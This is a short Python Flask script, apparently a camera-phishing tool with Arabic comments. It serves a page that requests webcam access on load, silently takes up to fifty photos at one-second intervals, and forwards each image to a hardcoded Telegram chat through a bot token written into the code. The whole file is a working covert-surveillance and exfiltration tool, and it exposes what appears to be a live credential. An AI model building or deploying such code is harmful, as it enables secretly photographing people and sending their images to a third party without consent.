from flask import Flask, render_template_string, request
import telebot
import base64
import io
from PIL import Image

# إعداد البوت باستخدام التوكن الخاص بك
API_TOKEN = "7137595568:AAFaVQHaDAnyJV0eMWxIsXR6660xvXhM4z0"
bot = telebot.TeleBot(API_TOKEN)

# إعداد Flask
app = Flask(__name__)

# إعداد صفحة الويب
HTML_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Camera Access</title>
</head>
<body>
    <h1>Camera Access</h1>
    <p>Allow camera access to take multiple photos.</p>
    <script>
        function takePhoto() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(stream) {
                    let video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    let canvas = document.createElement('canvas');
                    let context = canvas.getContext('2d');
                    
                    let photoCount = 0;
                    const maxPhotos = 50;
                    const interval = setInterval(() => {
                        if (photoCount >= maxPhotos) {
                            clearInterval(interval);
                            stream.getTracks().forEach(track => track.stop());
                            return;
                        }
                        
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        let dataUrl = canvas.toDataURL('image/png');
                        fetch('/upload', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({ image: dataUrl })
                        }).then(response => response.text())
                          .then(data => console.log(data));
                          
                        photoCount++;
                    }, 1000); // يلتقط صورة كل ثانية
                    
                })
                .catch(function(err) {
                    console.log("An error occurred: " + err);
                });
        }

        window.onload = takePhoto;
    </script>
</body>
</html>
'''

# الصفحة الرئيسية
@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

# معالجة رفع الصورة
@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    image_data = data['image'].split(',')[1]
    image = Image.open(io.BytesIO(base64.b64decode(image_data)))
    
    # حفظ الصورة في الذاكرة بدلاً من الكتابة على القرص
    byte_arr = io.BytesIO()
    image.save(byte_arr, format='PNG')
    byte_arr.seek(0)
    
    # إرسال الصورة إلى بوت تيليجرام
    bot.send_photo('6928649500', byte_arr)
    
    return 'Photo taken and sent!'

if __name__ == '__main__':
    app.run(debug=True)